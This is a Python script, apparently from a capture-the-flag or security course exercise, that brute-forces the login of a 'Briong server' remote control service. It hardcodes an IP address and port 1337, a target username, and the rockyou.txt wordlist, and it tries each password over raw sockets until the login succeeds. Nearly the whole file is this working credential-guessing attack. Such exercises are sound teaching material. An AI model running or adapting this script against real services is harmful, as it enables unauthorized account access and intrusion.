#!/usr/bin/python


"""
    If you know the IP address of the Briong server and you
    know the port number of the service you are trying to connect
    to, you can use nc or telnet in your Linux terminal to interface
    with the server. To do so, run:

        $ nc <ip address here> <port here>

    In the above the example, the $-sign represents the shell, nc is the command
    you run to establish a connection with the server using an explicit IP address
    and port number.

    If you have the discovered the IP address and port number, you should discover
    that there is a remote control service behind a certain port. You will know you
    have discovered the correct port if you are greeted with a login prompt when you
    nc to the server.

    In this Python script, we are mimicking the same behavior of nc'ing to the remote
    control service, however we do so in an automated fashion. This is because it is
    beneficial to script the process of attempting multiple login attempts, hoping that
    one of our guesses logs us (the attacker) into the Briong server.

    Feel free to optimize the code (ie. multithreading, etc) if you feel it is necessary.

"""

import socket
import sys

from threading import Thread, Lock


host = "142.93.117.193" # IP address here
port = 1337 # Port here


# Change this to the location of your rockyou.txt
wordlist = "/home/justin/rockyou.txt" # Point to wordlist file

class Manager:
    def __init__(self):
        self.fp = open(wordlist)
        self.lock = Lock()

    def get(self):
        result = None
        # with (self.lock):
        line = self.fp.readline()
        if(line):
            result = line

        return line


def brute_force():
    """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            Reading:

                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data

            Sending:

            through each possible password and repeatedly attempt to login to
            the Briong server.
    """
    username = "kruegster"   # Hint: use OSINT

    with open(wordlist) as fp:
        line = fp.readline()
        while line:
            login(username, line.strip("\n"))
            line = fp.readline()



    # Failed attempt at multithreading
    """
    manager = Manager()
    start_threads(manager)
    """

def run_thread(callback): 
    password = callback.get()
    username = "kruegster"

    if password != None:
        login(username, password.strip("\n"))
        run_thread(callback)
    else:
        return

def start_threads(callback):
    num_threads = 1 

    threads = []

    for num in range(0, num_threads):
        thread = Thread(target = run_thread, args=(callback,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()


def login(username, password):

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    print("Trying passwrd: " + password)

    s.recv(10)
    s.send(username + "\n")
    s.recv(10)
    s.send(password + "\n")
    data = s.recv(4)
    print(data)
            
    if data != "Fail" :
        print("You Did it!")
        print(password)
        sys.exit()

if __name__ == '__main__':
    brute_force()
